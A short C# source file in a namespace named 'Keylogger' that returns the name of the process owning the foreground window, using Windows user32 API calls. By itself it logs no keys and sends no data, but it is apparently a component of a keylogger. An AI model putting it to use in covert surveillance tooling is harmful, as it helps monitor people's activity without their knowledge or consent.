using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Keylogger
{
    public  class ActiveApp
    {

        [DllImport("user32.dll")]
        static extern int GetForegroundWindow();

        [DllImport("user32")]
        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd, out Int32 lpdwProcessId);


        private static Int32 GetWindowProcessID(Int32 hwnd)
        {
            Int32 pid = 1;
            GetWindowThreadProcessId(hwnd, out pid);
            return pid;
        }

        public static  String getActiveProccess()
        {
            Int32 hwnd = 0;
            hwnd = GetForegroundWindow();
            //return Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;
            try {
                return Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName.Split('.')[0];

            }
            catch (Exception e)
            {
                try
                {
                    string appExePath = Process.GetProcessById(GetWindowProcessID(hwnd)).MainModule.FileName;
                    return appExePath.Substring(appExePath.LastIndexOf(@"\") + 1).Split('.')[0];
                }
                catch (Exception z)
                {
                    return null;
                }
            }
         
        }
    }
}